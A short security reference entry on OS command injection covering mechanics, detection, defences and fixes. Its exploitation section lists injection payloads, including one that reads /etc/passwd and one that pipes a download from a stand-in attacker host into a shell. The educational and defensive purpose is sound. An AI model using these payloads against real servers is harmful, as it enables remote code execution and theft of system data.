---
title: OS Command Injection
category: Web App Testing
tags: [command injection, rce, shell, web, owasp, injection]
summary: User input reaches a system shell, letting an attacker run arbitrary OS commands on the server.
relatedTools: [Burp Suite, OWASP ZAP, Nuclei]
---

## How it works

When an app builds a shell command from user input (pings, file conversions,
archive tools), the shell interprets metacharacters (`;`, `|`, `&&`, backticks,
`$()`). Attacker input then becomes additional commands, not just data.

## How it gets exploited

```
# input that breaks out of the intended command
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
$(curl http://attacker/x | sh)   # blind / out-of-band
```

Impact is typically full remote code execution on the host.

## How to find the bug

- Find features that shell out (network tools, media/file processing, backups).
- Inject metacharacters and benign markers; use time delays (`; sleep 5`) or an
  out-of-band callback to detect blind cases.

## How to protect & defend

- **Don't call a shell.** Use language APIs/libraries instead of string commands.
- If you must exec, pass arguments as an **array** (no shell interpolation) and
  strictly **allowlist** values.
- Run with least privilege; isolate/sandbox the process.

## How to fix it

Replace shell concatenation with a parameterized API call (e.g. `execFile`/
`subprocess.run([...])` without `shell=True`). Verify by re-sending the
injection payloads — they should be treated as literal arguments and fail safely.
